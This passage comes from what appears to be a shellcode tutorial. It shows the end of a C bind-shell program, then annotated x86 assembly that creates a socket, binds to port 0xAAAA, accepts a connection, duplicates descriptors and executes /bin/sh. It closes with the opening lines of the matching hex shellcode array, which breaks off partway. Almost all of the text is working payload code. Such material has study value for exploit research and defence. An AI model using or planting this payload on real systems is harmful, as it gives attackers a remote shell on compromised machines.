&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; dup2(cli,2);
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; execve("/bin/sh",0,0);
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; }
}</pre>

<pre>The assembly code I generated from this C source:</pre>

<pre>BITS 32

jmp short&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; callit
doit:

pop&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; esi
xor&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; eax, eax
mov byte&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; [esi + 7], al&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; ; Terminate the /bin/sh string
mov&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; al,2&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; ; The fork() system call
int&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; 0x80&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; ; We call the kernel to fork us.&nbsp;
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; ;
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; ; Next code: socket(2,1,6)&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;
push byte&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; 0x06&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; ; The 3e argument&nbsp;&nbsp;&nbsp;
push byte&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; 0x01&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; ; The 2e argument&nbsp;
push byte&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; 0x02&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; ; The 1e argument&nbsp;
mov&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; al,97&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; ; The system call number
push&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; eax&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; ;
int&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; 0x80&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; ; And call the kernel&nbsp;&nbsp;
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; ;&nbsp;
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; ; Next code: bind(soc,(struct sockaddr *)&amp;serv_addr,0x10);
mov&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; edx,eax&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; ; We store the file descriptor that was returned from socket() in edx
xor&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; eax,eax&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; ; Now we will create the sockaddr_in structure
mov byte&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; [esi + 9],0x02&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; ; This equals: serv_addr.sin_family=2
mov word&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; [esi + 10],0xAAAA&nbsp;&nbsp;&nbsp;&nbsp; ; This equals: serv_addr.sin_port=0xAAAA
mov long&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; [esi + 12],eax&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; ; This equals: serv_addr.sin_addr.s_addr=0
push byte&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; 0x10&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; ; We now start with pushing the arguments, 0x10 is the 3e one.&nbsp;&nbsp;&nbsp;
lea&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; eax,[esi + 8]&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; ; Get the address of our structure, arg 2 of bind() is a pointer.
push&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; eax&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; ; And push it on the stack, our second argument is a fact
push&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; edx&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; ; And we push the last argument, the file descriptor, on the stack
xor&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; eax,eax&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; ; Clean up
mov&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; al,104&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; ; System call 104 represents bind.
push&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; eax&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; ;
int&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; 0x80&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; ; And call the kernel
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; ;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; ; Next code: listen(soc,1);&nbsp;
push byte&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; 0x1&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; ; We push the first argument on the stack&nbsp;
push&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; edx&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; ; We push the filedescriptor that is still stored in the edx register
xor&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; eax,eax&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; ; Cleanup
mov&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; al,106&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; ; System call 106 represents listen
push&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; eax&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; ;
int&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; 0x80&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; ; And call the kernel&nbsp;&nbsp;&nbsp;
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; ;
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; ; Next code: accept(soc,0,0);
xor&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; eax,eax&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; ; We need zero's for the arguments.
push&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; eax&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; ; Push the last argument, a zero&nbsp;
push&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; eax&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; ; Push the second argument, another zero&nbsp;
push&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; edx&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; ; Push the first argument, the file descriptor of our socket
mov&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; al,30&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; ; Define the system call we like to use, accept()
push&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; eax&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; ;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;
int&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; 0x80&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; ; And call the kernel to process our data&nbsp;
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; ;&nbsp;&nbsp;&nbsp;&nbsp;
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; ; Next code: dup2(cli,0) , dup2(cli,1) and dup2(cli,2)&nbsp;
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; ; We will do this in a loop since this creates smaller code.
mov&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; cl,3&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; ; Define our counter = 3&nbsp;
mov&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; ebx,-1&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; ; The C code for our loop is: b = -1; for(int i =3;i&gt;0;i--) { dup(cli,++b) };&nbsp;
mov&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; edx,eax&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; ; We store the file descriptor from accept() in edx.
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; ;&nbsp;&nbsp;
l00p:&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; ; The loop code starts here.&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;
inc&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; ebx&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; ; This is the instead of the ++b code&nbsp;
push&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; ebx&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; ; We push this value first because it represents the last argument&nbsp;
push&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; edx&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; ; We push the second argument, the file descriptor from accept()&nbsp;
mov&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; al,90&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; ; We define the system call
push&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; eax&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; ;&nbsp;&nbsp;
int&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; 0x80&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; ; And call the kernel to execute&nbsp;&nbsp;
sub&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; cl, 1&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; ; Substract 1 from cl
jnz l00p&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; ; This will continue the loop if cl != 0&nbsp;&nbsp;&nbsp;
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; ;&nbsp;&nbsp;
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; ; Next the execve of /bin/sh
xor&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; eax,eax&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; ; First we create some zero's
push&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; eax&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; ; The 3e argument == NULL
push&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; eax&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; ; So is the second&nbsp;
push&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; esi&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; ; The first argument is a pointer to our string /bin/sh&nbsp;
mov&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; al,59&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; ; We define the system call, execve.
push&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; eax&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; ;&nbsp;
int&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; 0x80&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; ; And execute&nbsp;&nbsp;


callit:
call&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; doit

db&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; '/bin/sh'</pre>

<pre>And again the most important part, the result:</pre>

<pre>char shellcode[] =
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; "\xeb\x6a\x5e\x31\xc0\x31\xdb\x88\x46\x07\xb0\x02\xcd\x80\x6a"
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; "\x06\x6a\x01\x6a\x02\xb0\x61\x50\xcd\x80\x89\xc2\x31\xc0\xc6"
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; "\x46\x09\x02\x66\xc7\x46\x0a\xaa\xaa\x89\x46\x0c\x6a\x10\x8d"
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; "\x46\x08\x50\x52\x31\xc0\xb0\x68\x50\xcd\x80\x6a\x01\x52\x31"
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; "\xc0\xb0\x6a\x50\xcd\x80\x31\xc0\x50\x50\x52\xb0\x1e\x50\xcd"
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; "\x80\xb1\x03\xbb\xff\xff\xff\xff\x89\xc2\x43\x53\x52\xb0\x5a"
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; "\x50\xcd\x80\x80\xe9\x01\x75\xf3\x31\xc0\x50\x50\x56\xb0\x3b"
